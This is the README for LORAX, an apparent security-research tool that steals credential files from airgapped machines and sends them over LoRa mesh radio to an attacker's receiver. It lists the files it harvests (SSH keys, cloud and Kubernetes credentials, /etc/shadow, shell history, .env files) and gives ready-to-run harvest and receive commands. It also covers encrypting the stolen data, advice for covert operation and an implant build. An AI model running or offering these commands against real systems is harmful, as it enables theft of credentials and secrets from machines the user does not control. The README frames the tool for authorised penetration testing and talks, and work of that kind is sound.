# LORAX — LoRa Xtract  v1.2

<p align="center">
  <img src="Images/Logo.png" alt="LORAX logo" width="300"/>
</p>

> **Security research and demonstration tool only.**  
> Built to demonstrate airgap data exfiltration via LoRa mesh radio for security talks and authorised penetration testing engagements. Do not use against systems you do not own or have explicit written permission to test.

---

## What is LORAX?

LORAX uses [Meshtastic](https://meshtastic.org/) LoRa mesh radio to exfiltrate credential files from a target machine to an attacker-controlled receiver — entirely off-network. No internet, no Wi-Fi, no Bluetooth required.

The attack concept:

```
[Victim machine]
  └─ Meshtastic node (USB or networked)
       └─ LoRa RF  ──►  [Solar relay node]  ──►  [Attacker node (serial)]
                                                        └─ [Attacker machine]
```

A solar-powered relay node in range of both ends means neither machine needs to be near the other, and no traditional network infrastructure is involved.

---

## Features

### Transfer
- **Harvest mode** — automatically finds high-value credential files in priority order and streams them to the receiver
- **Send mode** — send any arbitrary file
- **Receive mode** — listen for incoming transfers, reassemble, verify integrity, optionally auto-extract tar bundles
- **Scan mode** — preview what harvest would find without sending anything
- **Fire-and-forget by default** — no ACK wait needed; use `--wait-ack` for confirmed delivery when the return path is healthy

### Protocol
- Binary frame protocol (v2) over Meshtastic `PRIVATE_APP` portnum 256
- Up to 175 bytes raw payload per chunk (vs 110 bytes in v1)
- Auto-selects best compression: gzip, lzma, or none
- MD5 integrity verification on every transfer
- ACK/NACK retry — receiver sends NACK listing missing chunk numbers, sender retransmits only those
- Mid-transfer checkpoint NACKs every 20 chunks to catch gaps early
- Receiver-side MD5 deduplication cache — skips files already received

### Security
- **End-to-end encryption** — X25519 ECDH key exchange + ChaCha20-Poly1305 AEAD. Ephemeral key pair per transfer. Only the holder of the receiver's private key can decrypt. Protects content from all other mesh nodes even if they share the same channel PSK.
- Filename encrypted in the START frame — no plaintext metadata leaks to eavesdroppers on the same channel
- Path traversal protection on tar extraction

### Diagnostics & Utilities
- **Probe mode** — PING/PONG link quality test with RTT, SNR, hop count, and recommended `--delay`
- **Conn mode** — bidirectional connectivity check; both sides ping each other simultaneously to confirm the link works in both directions before a transfer
- **Sniff mode** — raw packet dump showing all Meshtastic traffic heard by a node; useful for confirming channel membership and diagnosing one-way link issues
- **Bench mode** — benchmarks transfer speed across four payload sizes (1 B, 1 KB, 10 KB, 100 KB)
- Channel utilisation monitoring with automatic backoff above 25%
- Multiple concurrent senders supported — each transfer runs in its own thread, chunks are routed to the correct transfer by TID

---

## Harvest Targets

When run in `harvest` mode, LORAX looks for the following in priority order (highest value first):

| Category | Files |
|---|---|
| SSH private keys | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`, `authorized_keys` |
| AWS credentials | `~/.aws/credentials`, `~/.aws/config` |
| GCloud | `application_default_credentials.json`, `credentials.db` |
| Kubernetes | `~/.kube/config` |
| Docker | `~/.docker/config.json` |
| Terraform | `~/.terraform.d/credentials.tfrc.json` |
| Package tokens | `~/.npmrc`, `~/.pypirc`, `~/.gem/credentials` |
| Netrc | `~/.netrc` |
| Git credentials | `~/.gitconfig`, `~/.git-credentials` |
| Shell history | `.bash_history`, `.zsh_history`, `.fish/fish_history`, `.sh_history` |
| System | `/etc/passwd`, `/etc/shadow` |
| `.env` files | Recursive search up to depth 4 |

Use `--harvest-only <keys>` to target specific categories: `ssh`, `aws`, `k8s`, `docker`, `git`, `history`, `tokens`, `terraform`, `netrc`, `gcloud`, `system`, `env`.

---

## Requirements

```bash
pip install meshtastic pypubsub pyserial cryptography
```

Python 3.8+. Compression, hashing, and archiving use the standard library.

---

## Usage

### Recv (attacker side — start first)

```bash
# Serial node, save to ./loot
python3 lorax.py --mode recv --radio serial --output ./loot

# With auto-extract of tar bundles
python3 lorax.py --mode recv --radio serial --output ./loot --extract
```

On startup, `recv` mode prints the node's **public key** — copy this and pass it to the sender with `--pubkey` to enable E2E encryption.

### Harvest (victim side — send credentials)

```bash
# Basic (channel encryption only)
python3 lorax.py --mode harvest --radio 192.168.8.179 --dest '!YOUR_NODE_ID'

# With E2E encryption (recommended)
python3 lorax.py --mode harvest --radio 192.168.8.179 --dest '!YOUR_NODE_ID' \
  --pubkey <base64url-public-key>

# Target specific categories only
python3 lorax.py --mode harvest --radio 192.168.8.179 --dest '!YOUR_NODE_ID' \
  --harvest-only ssh,aws,k8s

# Wait for confirmed ACK (requires healthy bidirectional link)
python3 lorax.py --mode harvest --radio 192.168.8.179 --dest '!YOUR_NODE_ID' \
  --pubkey <base64url-public-key> --wait-ack
```

### Send a specific file

```bash
python3 lorax.py --mode send --radio 192.168.8.179 --dest '!YOUR_NODE_ID' \
  --file /path/to/file --pubkey <base64url-public-key>
```

### Scan (preview only — nothing is sent)

```bash
python3 lorax.py --mode scan --radio 192.168.8.179
python3 lorax.py --mode scan --radio 192.168.8.179 --harvest-only ssh,aws
```

### Test link quality before transferring

```bash
# Probe — RTT, SNR, and recommended --delay (recv must be running on the other end)
python3 lorax.py --mode probe --radio 192.168.8.179 --dest '!YOUR_NODE_ID'

# Conn — bidirectional check; run on both sides simultaneously
python3 lorax.py --mode conn --radio 192.168.8.179 --dest '!YOUR_NODE_ID'   # sender side
python3 lorax.py --mode conn --radio serial         --dest '!043aae20'   # receiver side
```

Both sides will print `✓ LINK UP` if the link is bidirectional. If only one side prints it, the return path is broken (ACK will not reach the sender).

### Diagnose mesh visibility

```bash
# Dump all Meshtastic packets received by a node
python3 lorax.py --mode sniff --radio serial
python3 lorax.py --mode sniff --radio 192.168.8.179
```

### Benchmark

```bash
python3 lorax.py --mode bench --radio 192.168.8.179 --dest '!YOUR_NODE_ID' --delay 5
```

---

## Arguments

| Argument | Default | Description |
|---|---|---|
| `--mode` | required | `harvest`, `send`, `recv`, `scan`, `probe`, `bench`, `sniff`, `conn` |
| `--radio` | required | IP address for TCP node, or `serial` for USB auto-detect |
| `--dest` | `!YOUR_NODE_ID` | Destination node ID |
| `--delay` | `10` | Seconds between chunks. Run `probe` for a link-specific recommendation |
| `--file` | — | File to send (`send` mode only) |
| `--output` | `./received` | Output directory (`recv` mode) |
| `--extract` | off | Auto-extract tar bundles after receiving |
| `--port` | auto | Override serial port detection |
| `--harvest-only` | all | Comma-separated harvest category keys |
| `--wait-ack` | off | Block after each transfer and wait for ACK/NACK (requires bidirectional link) |
| `--pubkey` | — | Receiver's X25519 public key (base64url) for E2E encryption |
| `--keyfile` | `./lorax.key` | Receiver key file path; generated on first run if absent |

---

## E2E Encryption

LORAX supports end-to-end encryption independent of the Meshtastic channel PSK. This means even nodes sharing the same channel cannot read transferred content.

**Setup:**

1. Start the receiver — it prints its public key on startup:
   ```
   · Public key   : L9JhXyAWBLl-lnpGTF9x8W8u7lNmMSqSPXVXnlc3axY=
   ```

2. Pass that key to the sender with `--pubkey`:
   ```bash
   python3 lorax.py --mode harvest --radio 192.168.8.179 --dest '!YOUR_NODE_ID' \
     --pubkey L9JhXyAWBLl-lnpGTF9x8W8u7lNmMSqSPXVXnlc3axY=
   ```

The sender generates a fresh ephemeral X25519 key pair for every transfer. Both sides perform ECDH to derive a per-transfer session key via HKDF-SHA256. The filename and all chunk data are encrypted with ChaCha20-Poly1305. The private key stays on the receiver (`./lorax.key`, mode 600) and never leaves the device.

---

## Protocol (v2)

Binary frame format over Meshtastic `PRIVATE_APP` (portnum 256):

```
[MAGIC: 2B "LX"][TYPE: 1B][TID: 3B][BODY: variable]
```

| Frame | Type | Body |
|---|---|---|
| `T_START` | `0x01` | `[total:2][algo:1][enc_flag:1][...name or encrypted block]` |
| `T_CHUNK` | `0x02` | `[seq:2][data or ciphertext:N]` |
| `T_END` | `0x03` | `[md5:16]` |
| `T_ACK` | `0x04` | _(empty)_ |
| `T_NACK` | `0x05` | `[count:2][seq:2 ...]` |
| `T_PING` | `0x06` | _(empty)_ |
| `T_PONG` | `0x07` | `[snr_x10:2s][hops:1]` |
| `T_CHECK` | `0x08` | `[md5:16][filename:N]` — "do you already have this?" |
| `T_HAVE` | `0x09` | `[md5:16]` — "yes, skip it" |
| `T_CHECKPOINT` | `0x0A` | `[last_seq:2]` — mid-transfer NACK request |

Packet budget: 237B nominal LoRa payload → 54B Meshtastic overhead → **183B per frame**, giving **175B usable payload per chunk**.

---

## Hardware

Tested with:

- **Heltec V3** — networked node (TCP at `192.168.8.179`), acts as victim radio
- **ThinkNode M1** — USB serial node (`/dev/ttyACM0`), acts as attacker receiver
- **RAK4631** — solar-powered relay node

Any Meshtastic-compatible hardware works. For an implant concept (plug into a target machine and auto-harvest), a Pi Zero 2W + LoRa hat + LiPo is a practical build.

---

## Meshtastic Node Configuration Notes

**`rebroadcastMode` — critical for ACK delivery**  
If the receiving node (victim radio) has `rebroadcastMode: CORE_PORTNUMS_ONLY`, it will silently drop all incoming `PRIVATE_APP` packets at the firmware level before they reach the Python client. This makes the link appear one-way — harvests are received but ACKs, NACKs, and PONGs never arrive at the sender. Fix:

```bash
meshtastic --host <victim-radio-ip> --set device.rebroadcast_mode ALL
meshtastic --host <victim-radio-ip> --reboot
```

Use `--mode conn` to verify bidirectional comms before a transfer.

**MQTT**  
Meshtastic nodes with MQTT enabled and `uplink_enabled` on their channel publish traffic metadata (node IDs, timing, packet sizes) to a public MQTT broker. Disable MQTT on all nodes used for covert operation:

```bash
meshtastic --port /dev/ttyACM0 --set mqtt.enabled false
```

**Default channel PSK**  
The Meshtastic default PSK (`AQ==`) is publicly known. Any node with default settings can decrypt channel traffic. Create a private channel with a random PSK for all nodes used in a real engagement.

---

## Limitations

- LoRa is slow — a typical credential harvest takes several minutes at the default 10s delay
- EU 868 MHz band enforces 1% duty cycle; sustained transfers may trigger a TX backoff window
- File size limit: 512 KB per file (configurable in source)
- E2E encryption adds ~60B overhead to the START frame and 16B (AEAD tag) per chunk

---

## Disclaimer

This tool is provided for **authorised security testing, CTF competitions, and educational demonstrations only**. The author accepts no responsibility for misuse. Always obtain written permission before testing any system you do not own.
